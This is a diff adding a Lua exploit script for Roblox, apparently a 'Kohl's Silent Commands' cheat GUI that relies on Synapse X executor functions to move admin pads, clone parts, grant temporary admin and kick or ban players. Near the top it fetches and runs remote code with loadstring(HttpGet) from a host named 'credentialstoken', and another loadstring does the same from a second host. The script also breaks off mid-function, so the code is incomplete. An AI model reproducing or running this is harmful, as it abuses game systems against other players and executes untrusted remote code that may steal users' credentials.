@@ -1,0 +1,3205 @@
+
+--[[
+***OLD PUBLIC VERSION 1.14***
+!-The old script starter was lost on an old database.
+Current rebuild progress: 99% (Recorded on KSC_REWRITTEN)
+
+Changelog:
+|Memory Leaks may occur (Working on GC fix)
+|Studio will no longer support this current script (Debugging).
+|Modified KSC Login.
+|Added PlaceID check.
+|Removed additional command checks..
+|Removed some detrimental encoding..
+|Added extra UI changes.
+|Added AA based on KSC System.
+|Added experimental adminx which includes readmin.
+|Added admin pads + regen pad (Mover) GUI.
+|Added musicbot commands (activate with 'musicbot' in main textbox)
+*MusicBot's Steal-ID will only work on SynapseX based functions.
+|[Redacted] KSC System
+|Modified SecLog Feature 3
+|New Features Added To Textboxes (Off By Default).
+*Features may collide when on.
+|Modified A;E (Stage 3 Preparations)
+*Checking on outgoing gear.
+**May replace this with a different system.
+|Testing S.L. (Args)
+
+Known Bugs/Problems:
+|Spamming repads/Mover Gui will break the function
+|Resetting while resizing/cloning a house breaks the function.
+|Using rePad when all pads are deleted may break SKC.
+*Doesn't hang/freeze when function stops normally.
+(Specifically when directory "workspace.Terrain.GameFolder.Admin.Pads" still exists)
+]]
+
+--[[local Status,Display = pcall(function() -- Don't run this
+function cw()
+local Library = assert(LoadLibrary('RbxGui'))
+local getg = Instance.new('ScreenGui', game:GetService('CoreGui'))
+getg.Name = 'ConfB'
+local PTEM = {
+gg = 'Message'
+}
+Library.CreateStyledMessageDialog('Title','PCPSC2', game:GetService("HttpService"):JSONDecode(PTEM), 'msg','msg2')
+end
+end)
+if not status then warn('Modified function has errored'.)--]]
+--KCore
+local defaults = {'',1,2,2,true,false,false,true,true,false,false} --Outdated Defaults (Starts on _G.Setup)
+local first,second = pcall(function()
+loadstring(game:HttpGet(("https://credentialstoken.000webhostapp.com/"),true))()
+end)
+if not first then 
+_G.TrialStatus = false
+_G.LatestVersion = 6
+end
+local flagged = true
+local CCSecured = false
+local paused
+_G.Setup = _G.Setup
+_G.CurrentState = false
+_G.PushNewVersion = false
+_G.LoginStyle = 2
+_G.LoadStyle = 2 -- Only works on G.LoginStyle 1
+_G.EnterToExecute = true
+_G.PushSecureLogin = false -- Login
+_G.ClearOnTouch = false -- Login
+_G.PartDecimalsEnabled = true
+_G.sfxEnabled = true
+_G.Notify = false
+_G.ForceCapture = false
+_G.ScriptVersion = 6
+_G.BT = ':pm nilnilnilnilnilnil'
+if _G.ScriptVersion < _G.LatestVersion then 
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Kohl's SC";
+		Text = "Outdated script detected";
+	})
+end
+
+function NewVersion()
+loadstring(game:HttpGet(("https://cacheddatesiteo.000webhostapp.com/LandingScript"),true))()
+end
+
+
+local timeran = os.date('*t', os.time())
+local new = nil
+function g12(o)
+if o > 12 then 
+new = o - 12
+end end 
+
+wait()
+g12(timeran.hour)
+
+function gt()
+if new ~= nil then
+warn('Ran Script at ' .. new ..':'.. timeran.min .. ' PM!') 
+else
+warn('Ran Script at ' .. timeran.hour ..':'.. timeran.min .. ' AM!') 
+end end
+
+function CurrentVersion()
+	
+local cooldown = false
+function CH()
+if workspace.Terrain.GameFolder.Workspace:FindFirstChild('Basic House') then
+local args = {workspace.Terrain.GameFolder.Workspace['Basic House']}
+local gui4 = Instance.new('ScreenGui', game:GetService('CoreGui'))
+gui4.Name = 'HouseCloner'
+local F4 = Instance.new('Frame', gui4)
+F4.Size = UDim2.new(0,200,0,180)
+F4.Position = UDim2.new(.7,-100,.5,-100)
+F4.BackgroundColor3 = Color3.new(0,0,0)
+F4.BackgroundTransparency = .3
+local tl = Instance.new('TextLabel', F4)
+tl.Text = 'Set Position'
+tl.TextScaled = true
+tl.Font = 19
+tl.Size = UDim2.new(0,100,0,50)
+tl.Position = UDim2.new(.5,-50,.2,-25)
+tl.TextColor3 = Color3.new(255,255,255)
+tl.BackgroundTransparency = 1
+local tb = Instance.new('TextBox', F4)
+tb.Text = '0'
+tb.TextScaled = true
+tb.Font = 19
+tb.Size = UDim2.new(0,50,0,50)
+tb.TextColor3 = Color3.new(255,255,255)
+tb.BorderColor3 = Color3.new(255,255,255)
+tb.Position = UDim2.new(.23,-25,.5,-25)
+tb.BackgroundTransparency = .65
+tb.BorderSizePixel = 1.25
+local tb2= Instance.new('TextBox',F4)
+tb2.Text = '0'
+tb2.TextScaled = true
+tb2.Font = 19
+tb2.Size = UDim2.new(0,50,0,50)
+tb2.TextColor3 = Color3.new(255,255,255)
+tb2.Position = UDim2.new(.50,-25,.5,-25)
+tb2.BorderColor3 = Color3.new(255,255,255)
+tb2.BackgroundTransparency = .65
+tb2.BorderSizePixel = 1.25
+local tb3 = Instance.new('TextBox',F4)
+tb3.Text = '0'
+tb3.Font = 19
+tb3.TextScaled = true
+tb3.Size = UDim2.new(0,50,0,50)
+tb3.TextColor3 = Color3.new(255,255,255)
+tb3.Position = UDim2.new(.77,-25,.5,-25)
+tb3.BorderColor3 = Color3.new(255,255,255)
+tb3.BackgroundTransparency = .65
+tb3.BorderSizePixel = 1.25
+local b = Instance.new('TextButton',F4)
+b.Text = 'OK'
+b.TextScaled = true
+b.Font = 19
+b.Size = UDim2.new(0,50,0,50)
+b.TextColor3 = Color3.new(255,255,255)
+b.Position = UDim2.new(.5,-25,.8,-25)
+b.BackgroundTransparency = .8
+wait(1)
+
+function anti(a,b,c)
+local fe = false
+if not string.gmatch(a, "%d") then fe = true return(true) end
+if not string.gmatch(b, "%d") then fe = true return(true) end
+if not string.gmatch(c, "%d") then fe = true return(true) end
+end
+
+local values
+local default
+function conman()
+default = Vector3.new(-150,0,0)
+local a,b,c
+a=tb.Text;b=tb2.Text;c=tb3.Text
+if anti(a,b,c) == true then return(false)
+else
+a2=tonumber(tb.Text);b2=tonumber(tb2.Text);c2=tonumber(tb3.Text)
+newvalues = Vector3.new(a2,b2,c2)
+values = newvalues
+return(true)
+end
+end
+
+
+local debber = false
+local count = 0
+function a()
+count = count + 1
+end
+b.MouseButton1Click:Connect(function()
+gui4:Destroy()
+if debber == false then debber = true
+local use
+if not game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('Cl') then 
+game:GetService('Players'):Chat('give me clone')
+wait(.5)
+local rr =game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('Clone')
+rr.Name = 'Cl'
+wait(.5)
+game:GetService('Players').LocalPlayer.Backpack['Cl']:FindFirstChild('create').Name = 'cre'
+wait()
+end
+
+
+if conman() == true then
+use = values
+elseif conman() == false then 
+use = default
+end
+
+for i,v in pairs(workspace.Terrain.GameFolder.Workspace['Basic House']:GetChildren()) do 
+a()
+wait()
+v.Name = count
+end
+
+local count2 = workspace.Terrain.GameFolder.Workspace['Basic House']:GetChildren()
+local c2r = #count2
+for i = 1, c2r do 
+local argss = workspace.Terrain.GameFolder.Workspace['Basic House'][tostring(i)]
+local argss2 = workspace.Terrain.GameFolder.Workspace['Basic House'][tostring(i)].Position + use
+local argss3 = workspace.Terrain.GameFolder.Workspace['Basic House'][tostring(i)].Rotation
+game.Players.LocalPlayer.Backpack['Cl']['cre']:FireServer(argss, argss2,argss3)
+end
+end
+debber = false
+print('Finished')
+count = 0 
+end)
+end
+end
+
+function am()
+if not game:GetService('CoreGui'):FindFirstChild('KSCM') then
+local cd = false
+--[INFO] May be trashy gui, sorry.
+local mouse = game.Players.LocalPlayer:GetMouse()
+local sV
+local or2
+
+--Buttons
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = 'KSCM'
+local uis = Instance.new('UIScale', ScreenGui)
+uis.Scale = .66
+local Frame = Instance.new("Frame")
+local Credits = Instance.new("TextLabel")
+local Visible = Instance.new("TextButton")
+local Non = Instance.new("TextButton")
+local Close = Instance.new("TextButton")
+--Properties
+ScreenGui.Parent = game:GetService('CoreGui')
+Frame.Parent = ScreenGui
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BackgroundTransparency = 0.25
+Frame.Draggable = true
+Frame.Position = UDim2.new(0, 341, 0, 41)
+Frame.Size = UDim2.new(0, 350, 0, 200)
+Credits.Name = ""
+Credits.Parent = Frame
+Credits.BackgroundColor3 = Color3.new(1, 1, 1)
+Credits.BackgroundTransparency = 0.25
+Credits.Position = UDim2.new(0, 80, 0, 0)
+Credits.Size = UDim2.new(0, 200, 0, 100)
+Credits.Font = Enum.Font.SciFi
+Credits.FontSize = Enum.FontSize.Size24
+Credits.Text = "KSC Admin Mover"
+Credits.TextColor3 = Color3.new(100, 0, 0)
+Credits.TextSize = 24
+Visible.Name = "Visible" -- Visible List
+Visible.Parent = Frame
+Visible.BackgroundColor3 = Color3.new(1, 1, 1)
+Visible.BackgroundTransparency = 0.5
+Visible.Position = UDim2.new(-.10, 90, 0, 125)
+Visible.Size = UDim2.new(0, 100, 0, 50)
+Visible.Font = Enum.Font.SciFi
+Visible.FontSize = Enum.FontSize.Size18
+Visible.Text = "SetPos"
+Visible.TextColor3 = Color3.new(100, 0, 0)
+Visible.TextSize = 18
+Non.Name = "Non" --Non
+Non.Parent = Frame
+Non.BackgroundColor3 = Color3.new(1, 1, 1)
+Non.BackgroundTransparency = 0.5
+Non.Position = UDim2.new(.3, 95, 0, 125)
+Non.Size = UDim2.new(0, 100, 0, 50)
+Non.Font = Enum.Font.SciFi
+Non.FontSize = Enum.FontSize.Size18
+Non.Text = "Move" -- Non visible screen list
+Non.TextColor3 = Color3.new(100, 0, 0)
+Non.TextSize = 18
+Close.Name = "Close"
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.new(1, 1, 1)
+Close.BackgroundTransparency = 0.5
+Close.BorderSizePixel = 0
+Close.Position = UDim2.new(0, 318, 0, 0)
+Close.Size = UDim2.new(0, 31, 0, 30)
+Close.Font = Enum.Font.Arcade
+Close.Text = "X"
+Close.TextColor3 = Color3.new(100, 0, 0)
+Close.TextSize = 16
+--Core
+Visible.MouseButton1Click:Connect(function()
+wait(1)
+sV = mouse.hit.p
+warn(setValue)
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "KSC Mover";
+		Text = "Coordinates Set";
+	})
+end)
+
+Non.MouseButton1Click:Connect(function()
+function gr2()
+if cd == false then
+cd = true
+end
+local s3,m3 = pcall(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild('Move') then
+game.Players:Chat('btools me')
+end
+function cP2()
+get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+if #get > 0 then return(true)
+end
+end
+wait(.5)
+or2 = 0
+function count2()
+or2 = or2 + 1
+end
+
+function Cl2()
+if cP2() == true then
+if not game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('Delete') then
+game:GetService('Players'):Chat('btools me')
+wait(.25)
+end
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+local otc = pad:FindFirstChild('Head')
+if not otc then
+pad.Name = 'Tag'
+wait(.25)
+game:GetService('Players').LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Admin.Pads.Tag)
+end end
+end end
+
+Cl2()
+if cP2() == true then
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+if not pad:FindFirstChild('Head') then 
+local var = -1
+else
+count2()
+wait()
+pad.Name = tostring(or2)
+end 
+end
+end 
+local cfer = CFrame.new(0,0,0,0,0,-1,0,1,0,1,0,0) + sV + Vector3.new(0,7,0)
+local cfer2 = CFrame.new(0,0,0,0,0,-1,0,1,0,1,0,0) + sV
+function AA2()
+cfer = cfer + Vector3.new(-4,0,0)
+end
+function AT2()
+cfer2 = cfer2 + Vector3.new(-4,0,0)
+end
+if cP2() == true then
+local get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+for i = 1, #get do
+AA2()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cfer)
+AT2()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cfer2)
+end
+end
+
+function mr2()
+if workspace.Terrain.GameFolder.Admin:FindFirstChild('Regen') then 
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Regen, CFrame.new(0,0,0,0,0,-1,0,1,0,1,0,0) + sV + Vector3.new(1,0,0))
+else print('Kohls Silent Commands: Admin reset was not found.')
+end
+end
+wait()
+mr2()
+end)
+end
+gr2()
+end)
+Close.MouseButton1Click:Connect(function()
+wait (0.2) do
+        ScreenGui:Destroy()
+    end
+end)
+wait(1)
+cd = false
+end
+end
+function globalreset()
+if cooldown == false then
+cooldown = true
+end
+local s2,m2 = pcall(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild('Move') then
+game.Players:Chat('btools me')
+end
+function checkPads()
+get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+if #get > 0 then return(true)
+end
+end
+wait(.5)
+origin = 0
+function count()
+origin = origin + 1
+end
+
+function Clean()
+if checkPads() == true then
+if not game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('Delete') then
+game:GetService('Players'):Chat('btools me')
+wait(.25)
+end
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+local otc = pad:FindFirstChild('Head')
+if not otc then
+pad.Name = 'Tag'
+wait(.25)
+game:GetService('Players').LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Admin.Pads.Tag)
+end end
+end end
+
+Clean()
+if checkPads() == true then
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+if not pad:FindFirstChild('Head') then 
+local var = -1
+else
+count()
+wait()
+pad.Name = tostring(origin)
+end 
+end
+end 
+local cf = CFrame.new(-8.75,9.43001747,94.3430023,0,0,-1,0,1,0,1,0,0)
+local cf2 = CFrame.new(-8.75,5.43001747,94.3430023,0,0,-1,0,1,0,1,0,0)
+function ATALL()
+cf = cf + Vector3.new(-4,0,0)
+end
+function ATBEG()
+cf2 = cf2 + Vector3.new(-4,0,0)
+end
+if checkPads() == true then
+local get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+for i = 1, #get do
+ATALL()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cf)
+ATBEG()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cf2)
+end
+end
+
+function moveRegen()
+if workspace.Terrain.GameFolder.Admin:FindFirstChild('Regen') then 
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Regen, CFrame.new(-7.25,5.43001747,94.3430023,0,0,-1,0,1,0,1,0,0))
+else print('Kohls Silent Commands: Admin reset was not found.')
+end
+end
+wait()
+moveRegen()
+
+end)
+wait(2)
+cooldown = false
+if not s2 then print('Kohls Silent Commands: ⁽*⁾Error Occured At Function globalreset()')
+print('⁽*⁾This is probably due to a modified workspace.')
+end
+end
+
+function globalhide()
+if cooldown == false then
+cooldown = true
+end
+local s2,m2 = pcall(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild('Move') then
+game.Players:Chat('btools me')
+end
+function checkPads()
+get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+if #get > 0 then return(true)
+end
+end
+wait(.5)
+origin = 0
+function count()
+origin = origin + 1
+end
+
+function Clean()
+if checkPads() == true then
+if not game:GetService('Players').LocalPlayer.Backpack:FindFirstChild('Delete') then
+game:GetService('Players'):Chat('btools me')
+wait(.25)
+end
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+local otc = pad:FindFirstChild('Head')
+if not otc then
+pad.Name = 'Tag'
+wait(.25)
+game:GetService('Players').LocalPlayer.Backpack['Delete']['delete']:FireServer(workspace.Terrain.GameFolder.Admin.Pads.Tag)
+end end
+end end
+
+Clean()
+if checkPads() == true then
+for _,pad in pairs(workspace.Terrain.GameFolder.Admin.Pads:GetChildren()) do 
+if not pad:FindFirstChild('Head') then 
+local var = -1
+else
+count()
+wait()
+pad.Name = tostring(origin)
+end 
+end
+end 
+local cf = CFrame.new(-8.75,9.43001747,94.3430023,0,0,-1,0,1,0,1,0,0)
+local cf2 = CFrame.new(-8.75,2.43001747,94.3430023,0,0,-1,0,1,0,1,0,0)
+function ATALL()
+cf = cf + Vector3.new(-4,0,0)
+end
+function ATBEG()
+cf2 = cf2 + Vector3.new(-4,0,0)
+end
+if checkPads() == true then
+local get = workspace.Terrain.GameFolder.Admin.Pads:GetChildren()
+for i = 1, #get do
+ATALL()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cf)
+ATBEG()
+wait(.05)
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Pads[i].Head, cf2)
+end
+end
+
+function moveRegen()
+if workspace.Terrain.GameFolder.Admin:FindFirstChild('Regen') then 
+game.Players.LocalPlayer.Backpack.Move.setPos:FireServer(workspace.Terrain.GameFolder.Admin.Regen, CFrame.new(-7.25,2.43001747,94.3430023,0,0,-1,0,1,0,1,0,0))
+else print('Kohls Silent Commands: Admin reset was not found.')
+end
+end
+wait()
+moveRegen()
+end)
+end
+
+
+function re()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild('Re')
+then game.Players:Chat('give me resize')
+wait(.25)
+local ree= game.Players.LocalPlayer.Backpack:FindFirstChild('Resize')
+ree.Name = 'Re'
+wait(.25)
+game.Players.LocalPlayer.Backpack['Re']['resize'].Name = 're'
+end
+wait(.25)
+for i,v in pairs(game.Workspace:GetChildren()) do 
+wait(.15)
+if v:IsA('Part') then
+game.Players.LocalPlayer.Backpack['Re']['re']:FireServer(v, v.Size * Vector3.new(.4,.4,.4), v.CFrame.p * Vector3.new(.4,.4,.4)) end
+end
+end
+
+function KSCBOT()
+if not game:GetService('CoreGui'):FindFirstChild('KSCBOT') then
+syn.set_thread_identity(6)
+wait()
+local rr = syn.crypt.base64.encode('gg')
+local rr2 = syn.crypt.hash(rr)
+local gg = syn.crypt.base64.decode(rr2)
+--1:Steins Gate, 2: Objection 8-bit, 3:Konosuba, 4: Bitter, 5: Ace Attorney v1, 6: Ace Attorney v2, 7: Attack on titans, 8: Legends never die?, 9:Pending Conf
+local dictionary = {1,2,3,4,5,6,7,8,9,10,11}
+local ch = {'1847258886','865074356','600098848','3394262398','1634003767','1634022889','728472181', '2378768630', '3765721087', '627722878', '2996452105'}
+--Buttons
+local SGKSC = Instance.new("ScreenGui")
+SGKSC.Name = 'KSCBOT'
+local Scalar2 = Instance.new('UIScale', SGKSC)
+Scalar2.Scale = .66
+local Frame = Instance.new("Frame", SGKSC)
+local Credits = Instance.new("TextLabel")
+local Visible = Instance.new("TextButton")
+local Non = Instance.new("TextButton")
+local Close = Instance.new("TextButton")
+local IsDisabled = false
+--Properties
+SGKSC.Parent = game.CoreGui
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BackgroundTransparency = 0.25
+Frame.Draggable = true
+Frame.Position = UDim2.new(0, 341, 0, 41)
+Frame.Size = UDim2.new(0, 350, 0, 200)
+
+
+Credits.Name = "Credits"
+Credits.Parent = Frame
+Credits.BackgroundColor3 = Color3.new(1, 1, 1)
+Credits.BackgroundTransparency = 0.25
+Credits.Position = UDim2.new(0, 80, 0, 0)
+Credits.Size = UDim2.new(0, 200, 0, 100)
+Credits.Font = Enum.Font.SciFi
+Credits.FontSize = Enum.FontSize.Size24
+Credits.Text = "Music Bot v2"
+Credits.TextColor3 = Color3.new(100, 0, 0)
+Credits.TextScaled = true
+
+Visible.Name = "Visible" -- Visible List
+Visible.Parent = Frame
+Visible.BackgroundColor3 = Color3.new(1, 1, 1)
+Visible.BackgroundTransparency = 0.5
+Visible.Position = UDim2.new(-.10, 90, 0, 125)
+Visible.Size = UDim2.new(0, 100, 0, 50)
+Visible.Font = Enum.Font.SciFi
+Visible.FontSize = Enum.FontSize.Size18
+Visible.Text = "Replay"
+Visible.TextColor3 = Color3.new(100, 0, 0)
+Visible.TextScaled = true
+
+Non.Name = "Non" --Non
+Non.Parent = Frame
+Non.BackgroundColor3 = Color3.new(1, 1, 1)
+Non.BackgroundTransparency = 0.5
+Non.Position = UDim2.new(.3, 95, 0, 125)
+Non.Size = UDim2.new(0, 100, 0, 50)
+Non.Font = Enum.Font.SciFi
+Non.FontSize = Enum.FontSize.Size18
+Non.Text = "Steal ID" -- Non visible screen list
+Non.TextColor3 = Color3.new(100, 0, 0)
+Non.TextScaled = true
+
+Close.Name = "Close"
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.new(1, 1, 1)
+Close.BackgroundTransparency = 0.5
+Close.BorderSizePixel = 0
+Close.Position = UDim2.new(0, 318, 0, 0)
+Close.Size = UDim2.new(0, 31, 0, 30)
+Close.Font = Enum.Font.Arcade
+Close.Text = "X"
+Close.TextColor3 = Color3.new(100, 0, 0)
+Close.TextSize = 16
+--Core
+
+
+function replay()
+local newid = string.split(workspace.Terrain.GameFolder.Folder.Sound.SoundId, '=')
+wait()
+game.Players:Chat('music ' .. newid[2])
+end
+
+local can1 = true
+local can2 = true
+Visible.MouseButton1Click:Connect(function()
+replay()
+end)
+
+Non.MouseButton1Click:Connect(function()
+local newid = string.split(workspace.Terrain.GameFolder.Folder.Sound.SoundId, '=')
+wait()
+if checkcaller() == true then
+syn.write_clipboard(newid[2])
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Synapse X";
+	Text = "Copied to Clipboard";
+	Duration = 1.25;
+})
+else warn('Unsupported platform')
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Synapse X";
+	Text = "Unsupported function";
+	Duration = 1.25;
+})
+end
+end)
+
+Close.MouseButton1Click:Connect(function()
+wait (0.15) do
+        SGKSC:Destroy()
+	IsDisabled = true --None of these actually 'disable' the script
+	wait()
+	script.Disabled = true
+	warn('Script destroyed')
+	script:Destroy()
+    end
+end)
+
+function compare(a,b)
+if a == b then 
+local cc = tonumber(a)
+game.Players:Chat('music ' .. ch[cc])
+end
+end
+
+function randoms()
+local pusher = ch[math.random(1,#ch)]
+game.Players:Chat('music ' .. pusher)
+end
+
+function MusicBot(obj)
+local lower = string.lower(obj)
+	local len = string.len(lower)
+	if string.find(lower,":replay") then
+	replay()
+	elseif string.find(lower, ":random") then
+	randoms()
+	elseif tonumber(obj) then
+	for _,find in pairs(dictionary) do 
+	local newsplit = tostring(find)
+	compare(newsplit, obj)
+	end
+	end
+	end
+
+game.Players.LocalPlayer.Chatted:connect(function(msg)
+	if IsDisabled == false then
+	MusicBot(msg)
+	end
+end)
+end
+end	
+	
+	
+local BanLand = {}
+local attempts = 0
+attempts = 0
+local backupat = 0
+local CR = false
+local ab;local cd; local xedfunc;local zen;local b=math.sqrt(900)*2-(29.5*2);local function c(d)local e=d*2+15250-7650;zen=math.sqrt(e)wait() end;c(b)
+
+function CollectData()
+local sndstart = Instance.new('Sound')
+sndstart.SoundId = 'rbxassetid://561413719'
+if _G.sfxEnabled == false then
+	sndstart.Volume = 0
+	else
+	sndstart.Volume = .5
+	end
+sndstart.Name = '開始'
+sndstart.Looped = false
+
+local sndin = Instance.new('Sound')
+sndin.SoundId = 'rbxassetid://1862047553'
+if _G.sfxEnabled == false then
+	sndin.Volume = 0
+	else
+	sndin.Volume = .5
+	end
+sndin.Name = '情報'
+sndin.Looped = false
+
+local lang2= 'Japanese'
+--GUI
+local SGui = Instance.new("ScreenGui", game:GetService('CoreGui'))
+local Frame = Instance.new("Frame", SGui)
+local Person = Instance.new("TextBox", Frame)
+local Title = Instance.new("TextLabel", Frame)
+local ls = Instance.new('LocalScript')
+local Insane = Instance.new("TextButton", Frame)
+local scalar= Instance.new("UIScale", SGui)
+local Close = Instance.new ("TextButton", Frame)
+local weeb = Instance.new("TextButton", Frame)
+local ban = Instance.new("TextButton", Frame)
+local Fr2 = Instance.new('Frame')
+local r1 = Instance.new('TextBox')
+local r2 = Instance.new('TextBox')
+local r3 = Instance.new('TextBox')
+local ext = Instance.new('TextButton', Frame)
+local antexa = Instance.new('TextButton', Frame)
+local antexadis = Instance.new('TextButton',Frame)
+local anttog = Instance.new('TextButton', Frame)
+local rand = Instance.new('TextButton')
+local sp = Instance.new('TextButton')
+local sfxf = Instance.new('Folder')
+sfxf.Parent = SGui
+sfxf.Name = '音'
+sndstart.Parent = sfxf
+sndstart:Play()
+sndin.Parent = sfxf
+local hold= Instance.new('Frame')
+local but1 = Instance.new('TextButton',Frame)
+local but2= Instance.new('TextButton',Frame)
+local but3 = Instance.new('TextButton',Frame)
+local but4 = Instance.new('TextButton',Frame)
+local but5 = Instance.new('TextButton',Frame)
+local but6 = Instance.new('TextButton',Frame)
+local but7 = Instance.new('TextButton',Frame)
+local but8 = Instance.new('TextLabel',Frame)
+local but9 = Instance.new('TextButton',Frame)
+local but10 = Instance.new('TextButton',Frame)
+local workin = Instance.new("TextButton", Frame)
+local remover = Instance.new("TextButton", Frame)
+local KickPerson = Instance.new("TextBox", Frame)
+local BanPerson = Instance.new("TextBox", Frame)
+local BanPlayer = Instance.new("TextButton", Frame)
+local KickPlayer = Instance.new('TextButton', Frame)
+local minimize = Instance.new('TextButton', Frame)
+local del = Instance.new('TextButton', Frame)
+SGui.Name = 'サイレントコマンド'
+ls.Parent = Frame
+ls.Name = 'コア'
+function checktags(plr)
+local mem = Instance.new('BoolValue')
+mem.Name = plr
+wait()
+mem.Parent = workspace
+mem.Value = true
+local msg = 'Ended due to user input (D)'
+local debounce = true
+local de = true
+local can = true
+--var
+function change(args)
+if string.find(args, 'me') then 
+local new = string.gsub(args, 'me', mem.Name)
+return(new)
+else
+return(args)
+end
+end
+
+function change2(args)
+if string.find(args, 'me') then 
+local new = string.gsub(args, 'me', mem.Name)
+return(new)
+else
+return(args)
+end
+end
+
+local plrn = game:GetService('Players').LocalPlayer.Name
+print('Created temporary admin for ' .. plr)
+game:GetService('Players'):Chat('pm ' .. plr .. ' You have been given admin.')
+sndin:Play()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Silent Kohl's Commands";
+		Text = 'Created temporary admin for ' .. plr;
+	})
+mem.Changed:Connect(function()
+if mem.Value == false then 
+can = false
+elseif mem.Parent == nil then 
+can = false
+end
+end)
+
+game:GetService('Players')[mem.Name].Chatted:Connect(function(args)
+if debounce == true then
+if mem.Parent == workspace then
+wait()
+debounce = false
+if can == true then
+game.Players:Chat(change2(args))
+end
+end
+wait(1.5)
+debounce = true
+end
+end)
+end
+
+
+
+function outloop2(args)
+for i,v in pairs(game.Workspace:GetChildren()) do 
+if v.Name == args then 
+if v:IsA('BoolValue') then v.Value = false 
+wait(1) v:Destroy()
+end end end
+end
+
+
+function removeadmins(args)
+local firstargs = string.split(args, 'readmin ')
+for _,plr in pairs(game:GetService('Players'):GetChildren()) do
+if string.lower(plr.Name) == string.lower(firstargs[2]) then 
+outloop2(plr.Name)
+end end
+print('Removed temporary admin for ' .. firstargs[2])
+game:GetService('Players'):Chat('pm ' .. firstargs[2] .. ' Your admin has been revoked.')
+sndin:Play()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Silent Kohl's Commands";
+		Text = 'Removed temporary admin for ' .. firstargs[2];
+	})
+end
+
+
+function addadmins(args)
+local firstargs = string.split(args, 'adminx ')
+for _,plr in pairs(game:GetService('Players'):GetChildren()) do
+if string.lower(plr.Name) == string.lower(firstargs[2]) then 
+local newargs = plr.Name
+checktags(plr.Name)
+end
+end
+end
+
+
+local indexxer = {weeb,ban,ext,remover,workin}
+local origininverted = false
+function invertedcolors()
+if origininverted == false then
+origininverted = true
+for _,ob in pairs(SGui:GetDescendants()) do
+local statistic,meta = pcall(function()
+if ob['BackgroundColor3'] then
+ob.BackgroundColor3 = Color3.new(255,255,255)
+end end) end
+for _,indexxed in pairs(indexxer) do
+indexxed.TextColor3 = Color3.new(0,0,0)
+end
+KickPlayer.TextColor3= Color3.new(0,0,0)
+BanPlayer.TextColor3= Color3.new(0,0,0)
+Insane.TextColor3= Color3.new(0,0,0)
+rand.TextColor3= Color3.new(0,0,0)
+sp.TextColor3= Color3.new(0,0,0)
+del.TextColor3 = Color3.new(0,0,0)
+else origininverted = false
+for _,returned in pairs(SGui:GetDescendants()) do
+local newstatistic,newmeta = pcall(function()
+if returned['BackgroundColor3'] then
+returned.BackgroundColor3 = Color3.new(0,0,0)
+end end) end
+for _,indexxed2 in pairs(indexxer) do
+indexxed2.TextColor3 = Color3.new(100,2,0) end
+KickPlayer.TextColor3= Color3.new(100,0,0)
+BanPlayer.TextColor3= Color3.new(100,0,0)
+Insane.TextColor3= Color3.new(100,0,0)
+del.TextColor3= Color3.new(100,0,0)
+rand.TextColor3= Color3.new(255,255,255)
+sp.TextColor3= Color3.new(255,255,255)
+r1.BackgroundColor3=Color3.new(255,255,255)
+r2.BackgroundColor3=Color3.new(255,255,255)
+r3.BackgroundColor3=Color3.new(255,255,255)
+end end
+function EndKSCDS()
+if game:GetService('Workspace'):FindFirstChild('EnabledLogic') then 
+local OO2 = game:GetService('Workspace').EnabledLogic
+OO2.Value = false
+sndin:Play()
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Kohl's Silent Commands";
+		Text = "Disabled KSC System";
+	})
+wait(.5)
+OO2:Destroy()
+game:GetService('Players'):Chat('h Disabled SystemLogics')
+end
+end
+
+
+function DefinedSystem()
+local variablecontingency 
+local plrservice = game:GetService('Players')
+if not workspace:FindFirstChild('EnabledLogic') then
